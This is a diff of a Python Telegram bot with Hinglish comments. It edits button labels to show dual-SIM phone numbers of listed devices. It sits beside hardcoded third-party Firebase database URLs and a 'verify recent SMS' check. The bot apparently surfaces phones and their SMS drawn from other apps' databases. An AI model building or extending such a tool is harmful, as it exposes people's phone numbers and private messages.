@@ -54,7 +54,6 @@ def extract_urls_from_files() -> list:
             except Exception: pass
     return list(extracted_urls)
 
-# 🔥 SAARI NAYI FIREBASE URLs YAHAN ADD KAR DI GAYI HAIN 🔥
 HARDCODED_URLS = [
     "https://dost-42d3f-default-rtdb.firebaseio.com",
     "https://emesh-94556-default-rtdb.firebaseio.com",
@@ -452,7 +451,6 @@ def is_spamming(user_id: int) -> bool:
     user_cooldowns[user_id] = now
     return False
 
-# 🔥 BUG FIX: Yeh function hamesha True return karega taaki button click par promo message na aaye 🔥
 async def check_force_sub(bot, user_id: int) -> bool:
     return True
 
@@ -724,14 +722,21 @@ async def verify_recent_sms(device: Device, max_age_seconds=14400) -> bool:
     except: pass
     return False
 
+# 🔥 YAHAN MAINE DUAL SIM DISPLAY KA FIX KIYA HAI 🔥
 def _format_btn_label(d: Device) -> str:
     icon = "🟢" if d.status == "online" else "🔴"
     if d.numbers:
-        main_num = str(d.numbers[0])
-        display_num = main_num if main_num.startswith("+") else f"+{main_num}"
-        if len(display_num) > 14: display_num = display_num[:13] + "…"
-        lbl = f"{icon} {display_num}"
-        if len(d.numbers) > 1: lbl += " ⧉" 
+        # Dono numbers ko button par show karne ke liye format karte hain
+        disp_nums = [str(n) if str(n).startswith("+") else f"+{n}" for n in d.numbers[:2]]
+        lbl = f"{icon} " + " & ".join(disp_nums)
+        
+        # Agar text bohot lamba ho jaye toh usko balance karne ke liye limit set ki hai
+        if len(lbl) > 35: 
+            lbl = lbl[:33] + "…"
+            
+        # Agar 2 se bhi zyada numbers hain toh aicon add hoga
+        if len(d.numbers) > 2: 
+            lbl += " ⧉" 
     else:
         lbl = f"{icon} {d.name[:8]}"
     return lbl
@@ -809,6 +814,7 @@ async def show_fresh5_page(message_obj, chat_id, page, bot_token, users_db):
     
     kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="home")])
     await safe_edit(message_obj, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+
 
 def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
     users_db = all_users
